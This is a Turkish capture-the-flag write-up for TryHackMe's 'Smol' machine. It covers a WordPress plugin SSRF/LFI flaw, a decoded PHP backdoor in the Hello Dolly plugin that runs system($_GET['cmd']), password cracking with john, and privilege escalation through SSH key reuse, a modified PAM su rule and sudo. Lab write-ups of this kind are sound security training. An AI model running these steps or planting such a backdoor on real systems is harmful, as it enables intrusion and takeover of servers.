---
title: 'TryHackMe | Smol WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [wordpress, lfi, pam]
render_with_liquid: false
media_subpath: /images/tryhackme_smol/
image:
  path: logo.webp
---

## Özet

### Makine hakkında ek bilgiler

- WordPress içerik yönetim sistemi kullanılıyor.
- Zafiyetli bir eklenti kullanılıyor.
- Eklentilerin içerisinde bir yerde arka kapı bulunuyor.
- GPU’su olmayan bilgisayarlarda john’un hashcat’ten daha hızlı olduğu yazıyor. Kısaca hash kırma işleminin uzun süreceğini söylüyor.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sSVC -T4 10.10.240.79
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80 numaralı portun incelenmesi

![](1.webp){: width="1200" height="600" }

Kullanılan zafiyetli eklentiyi tespit etmek için wpscan aracını kullanmaya karar verdim.

```console
$ wpscan --url http://www.smol.thm/ -e p
[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

Tarama sonucunda `jsmol2wp` adında bir bir eklenti kullandığını öğreniyoruz. Eklentiyi internette arattığımızda [bu](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt) github sayfası ile karşılaşıyoruz.

## Sömürü aşaması

Burada eklentinin `jsmol.php` sayfasında hem `XSS` hem de `SSRF` zafiyetinin barındığı yazıyor. Query parametresinin etkilendiği bu uzantıyı alıp hedef uygulamanın sonuna ekliyorum.

![](2.webp){: width="1200" height="600" }

Böylece config dosyasındaki veri tabanı bilgilerini almış olduk. Bu bilgileri kullanarak panele giriş yapabiliyorum.

![](3.webp){: width="1200" height="600" }

Panelde eklentiler ve temalar sayfası bulunmuyor. Sayfalar kategorisini seçtiğimde ise `Webmaster Tasks!!` adında bir yazı ile karşılaşıyorum.

![](4.webp){: width="1200" height="600" }

Eklentilerin birinde gizli bir arka kapı olduğu bilgisi verilmişti zaten. Burada o eklentinin “Hello Dolly” olduğu yazıyor. Biraz önce bulduğumuz SSRF zafiyeti ile eklentinin kaynak kodunu görüntüleyelim.

![](5.webp){: width="1200" height="600" }

Gördüğünüz üzere önce base64 ile kodlanmış veriyi çözüyor daha sonra ise eval fonksiyonu ile çalıştırıyor.

```console
$chepy "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA="
>>> from_base64
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
>>> unicode_to_str
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); } 
>>>
```

Kodlanmış bu veriyi chepy aracı ile çözdükten sonra “cmd” parametresini kullanarak sistemde komut çalıştırabileceğimizi görüyoruz. Parametreyi kullanarak sistemden shell elde etmek için eklentinin bulunduğu sayfaya yöneldim ama komutu gönderdiğimde herhangi bir tepki vermedi. Haliyle komut çalıştırabilmek için bu eklentinin kullanıldığı bir alan bulmamız gerektiğini düşündüm. Ana sayfaya tekrar döndüğümde sağ kısımda şiirden bir parça gördüm ve ana sayfada kullanıldığını düşünerek parametreyi ekledim.

![](6.webp){: width="1200" height="600" }

Komut çalıştırabildiğimize göre sistemden bir shell alabiliriz.

![](7.webp){: width="1000" height="550" }

Bağlantı geldikten sonra kullanıcıları görmek için /home dizinine gittim. Hiçbir kullanıcı dizinini görüntüleme yetkimiz yok. Ayrıca tüm kullanıcılar “internal” grubuna dahil edilmiş. Bir şekilde bu gruba dahil olursak tüm kullanıcı dizinlerini gezebiliriz.

```console
www-data@smol:/var/www/wordpress/wp-admin$ ls -la /home
total 24
drwxr-xr-x  6 root  root     4096 Aug 16  2023 .
drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..
drwxr-x---  2 diego internal 4096 Aug 18  2023 diego
drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
drwxr-x---  5 think internal 4096 Jan 12  2024 think
drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
```

## Yetki yükseltme

### diego

Öncelikle wp-config.php dosyasındaki bilgileri kullanarak veri tabanına giriş yaptım. wp_user tablosundaki hashleri ve kullanıcı adlarını alıp bir dosyaya yazdım. Daha sonra bu hashleri kırması için john aracını kullandım.

![](8.webp){: width="1200" height="600" }

Karşılaştırma işlemi devam ederken `diego` kullanıcısının parolasını buldu. Diego kullanıcısına geçiş yapıp kendi dizininden ilk bayrağı alıyorum.

### think

internal grubuna girdiğimize göre diğer kullanıcıların dizinlerini gezebiliriz. 

```console
diego@smol:/home/gege$ ls -la
...
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
diego@smol:/home/think$ ls -la
...
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
...
```

gege kullanıcısının dizininde wordpress.old.zip dosyası bulunuyor ama yetkimiz dışında. think kullanıcısının dizininde ise .ssh dizini bulunuyor. Buradaki id_rsa dosyasını kullanarak think kullanıcısına geçiş yapıyorum.

```console
$ chmod 600 id_rsa
$ ssh think@10.10.240.79 -i id_rsa
```

### gege

Bu kullanıcıdanda muhtemelen gege kullanıcısına geçiş yapmamız gerekiyor. Sistemde uzun bir süre gezdikten sonra think kullanıcısının parola kullanmadan gege kullanıcısına geçiş yapabileceğini öğrendim.

```console
think@smol:/etc/pam.d$ cat su                                                                                                                                                                 
...                                                                                                                                                 
auth  [success=ignore default=1] pam_succeed_if.so user = gege                                                                                                                                
auth  sufficient                 pam_succeed_if.so use_uid user = think
...
```

/etc/pam.d dizini sistemdeki doğrulamalar için kullanılan yapılandırma dosyalarını barındıyor. Bunlardan biri olan su komutunun değiştirildiğini görüyoruz.

```console
think@smol:/etc/pam.d$ su gege
gege@smol:/etc/pam.d$ cd
gege@smol:~$ ls
wordpress.old.zip
```

### xavi

Kullanıcı değişiminden sonra zip dosyasını çıkarmak için /home/gege dizine gittim ama parola koruması olduğu için dosyayı çıkaramadım. Bu zip dosyasını kırmak için önce kendi sistemime indirdim. Daha sonra “zip2john wordpress.old.zip > hash” komutu ile kırılabilir bir formata çevirdim ve john aracını çalıştırdım

```console
$ cat hash 
wordpress.old.zip:$pkzip$8*1*1*0*0*24*a31c*c2fb90b39...
$ sudo john hash -w=Desktop/rockyou.txt
...
*** (wordpress.old.zip)
...
```

Zip dosyasını çıkartıp içerisindeki config dosyasını açtığımızda xavi kullanıcısının parolasını görüyoruz.

```php
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', '***' );
```

### root

xavi kullanıcısına geçiş yaptıktan sonra sudo haklarımızı görüntülediğimizde herhangi bir komutu herhangi bir kullanıcı olarak çalıştırabileceğimizi görüyoruz ve `sudo su` komutunu kullanarak en yetkili hesaba geçiş yapıyoruz.

```console
xavi@smol:~$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
xavi@smol:~$ sudo su
root@smol:/home/xavi$ ls /root
...
-rw-r-----  1 root root   33 Aug 16  2023 root.txt
...
```
